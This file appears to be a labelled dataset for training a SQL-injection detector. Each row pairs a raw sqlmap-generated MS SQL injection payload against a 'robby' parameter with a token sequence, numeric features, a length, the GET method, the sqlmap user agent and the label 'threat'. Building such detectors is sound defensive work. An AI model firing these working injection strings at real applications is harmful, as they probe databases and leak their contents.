"robby"" AND 1585 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(98)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (1585=1585) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(112)+CHAR(120)+CHAR(113))) AND ""TeVV""=""TeVV",STR DQUT AND INT IN SELECT CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS SELECT CASE WHEN INT EQ INT THEN CHAR INT ELSE CHAR INT END PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT AND DQUT STR DQUT EQ DQUT STR,0.07272727272727272 0.09090909090909091 0.10909090909090909 0.12727272727272726 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.12727272727272726 0.10909090909090909 0.09090909090909091 0.07272727272727272,354,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby"" AND 1585 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(98)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (1585=1585) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(112)+CHAR(120)+CHAR(113))) AND ""vjyc"" LIKE ""vjyc",STR DQUT AND INT IN SELECT CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS SELECT CASE WHEN INT EQ INT THEN CHAR INT ELSE CHAR INT END PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT AND DQUT STR DQUT LIKE DQUT STR,0.07272727272727272 0.09090909090909091 0.10909090909090909 0.12727272727272726 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.12727272727272726 0.10909090909090909 0.09090909090909091 0.07272727272727272,361,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby%') AND 1585 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(98)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (1585=1585) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(112)+CHAR(120)+CHAR(113))) AND ('%'=',STR PRCNT SQUT RPRN AND INT IN SELECT CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS SELECT CASE WHEN INT EQ INT THEN CHAR INT ELSE CHAR INT END PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT AND LPRN SQUT PRCNT SQUT EQ SQUT,0.07017543859649122 0.08771929824561403 0.10526315789473684 0.12280701754385964 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.12280701754385964 0.10526315789473684 0.08771929824561403 0.07017543859649122,358,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby%')) AND 1585 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(98)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (1585=1585) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(112)+CHAR(120)+CHAR(113))) AND (('%'=',STR PRCNT SQUT RPRN RPRN AND INT IN SELECT CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS SELECT CASE WHEN INT EQ INT THEN CHAR INT ELSE CHAR INT END PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT AND LPRN LPRN SQUT PRCNT SQUT EQ SQUT,0.06779661016949153 0.0847457627118644 0.1016949152542373 0.11864406779661017 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.11864406779661017 0.1016949152542373 0.0847457627118644 0.06779661016949153,364,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby%' AND 1585 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(98)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (1585=1585) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(112)+CHAR(120)+CHAR(113))) AND '%'=',STR PRCNT SQUT AND INT IN SELECT CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS SELECT CASE WHEN INT EQ INT THEN CHAR INT ELSE CHAR INT END PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT AND SQUT PRCNT SQUT EQ SQUT,0.07272727272727272 0.09090909090909091 0.10909090909090909 0.12727272727272726 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.12727272727272726 0.10909090909090909 0.09090909090909091 0.07272727272727272,352,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby%"" AND 1585 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(98)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (1585=1585) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(112)+CHAR(120)+CHAR(113))) AND ""%""=""",STR PRCNT DQUT AND INT IN SELECT CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS SELECT CASE WHEN INT EQ INT THEN CHAR INT ELSE CHAR INT END PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT AND DQUT PRCNT DQUT EQ DQUT,0.07272727272727272 0.09090909090909091 0.10909090909090909 0.12727272727272726 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.12727272727272726 0.10909090909090909 0.09090909090909091 0.07272727272727272,352,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby) AND 1585 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(98)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (1585=1585) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(112)+CHAR(120)+CHAR(113))) AND (1124=1124,STR RPRN AND INT IN SELECT CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS SELECT CASE WHEN INT EQ INT THEN CHAR INT ELSE CHAR INT END PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT AND LPRN INT EQ INT,0.07547169811320754 0.09433962264150943 0.11320754716981132 0.1320754716981132 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1320754716981132 0.11320754716981132 0.09433962264150943 0.07547169811320754,348,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby AND 1585 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(98)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (1585=1585) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(112)+CHAR(120)+CHAR(113))),STR AND INT IN SELECT CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS SELECT CASE WHEN INT EQ INT THEN CHAR INT ELSE CHAR INT END PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT,0.0851063829787234 0.10638297872340426 0.1276595744680851 0.14893617021276595 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.14893617021276595 0.1276595744680851 0.10638297872340426 0.0851063829787234,322,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby AND 1585 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(98)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (1585=1585) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(112)+CHAR(120)+CHAR(113)))-- vUKQ,STR AND INT IN SELECT CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS SELECT CASE WHEN INT EQ INT THEN CHAR INT ELSE CHAR INT END PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT DSCMT STR,0.08163265306122448 0.1020408163265306 0.12244897959183673 0.14285714285714285 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.14285714285714285 0.12244897959183673 0.1020408163265306 0.08163265306122448,331,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
robby AND 1585 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(98)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (1585=1585) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(112)+CHAR(120)+CHAR(113)))# SPRh,STR AND INT IN SELECT CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS SELECT CASE WHEN INT EQ INT THEN CHAR INT ELSE CHAR INT END PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT HASH STR,0.08163265306122448 0.1020408163265306 0.12244897959183673 0.14285714285714285 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.16326530612244897 0.14285714285714285 0.12244897959183673 0.1020408163265306 0.08163265306122448,332,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby' AND 3724=CONVERT(INT,(SELECT CHAR(113)+CHAR(122)+CHAR(98)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (3724=3724) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(112)+CHAR(120)+CHAR(113)))-- DMvB",STR SQUT AND INT EQ CONVERT INT CMMA SELECT CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS SELECT CASE WHEN INT EQ INT THEN CHAR INT ELSE CHAR INT END PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT DSCMT STR,0.07547169811320754 0.09433962264150943 0.11320754716981132 0.1320754716981132 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1320754716981132 0.11320754716981132 0.09433962264150943 0.07547169811320754,342,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby')) AND 3724=CONVERT(INT,(SELECT CHAR(113)+CHAR(122)+CHAR(98)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (3724=3724) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(112)+CHAR(120)+CHAR(113))) AND (('KCsA'='KCsA",STR SQUT RPRN RPRN AND INT EQ CONVERT INT CMMA SELECT CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS SELECT CASE WHEN INT EQ INT THEN CHAR INT ELSE CHAR INT END PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT AND LPRN LPRN SQUT STR SQUT EQ SQUT STR,0.06451612903225806 0.08064516129032258 0.0967741935483871 0.11290322580645161 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.11290322580645161 0.0967741935483871 0.08064516129032258 0.06451612903225806,374,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"robby' AND 3724=CONVERT(INT,(SELECT CHAR(113)+CHAR(122)+CHAR(98)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (3724=3724) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(112)+CHAR(120)+CHAR(113))) AND 'ykTY'='ykTY",STR SQUT AND INT EQ CONVERT INT CMMA SELECT CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS SELECT CASE WHEN INT EQ INT THEN CHAR INT ELSE CHAR INT END PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT AND SQUT STR SQUT EQ SQUT STR,0.06896551724137931 0.08620689655172414 0.10344827586206896 0.12068965517241378 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.12068965517241378 0.10344827586206896 0.08620689655172414 0.06896551724137931,362,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
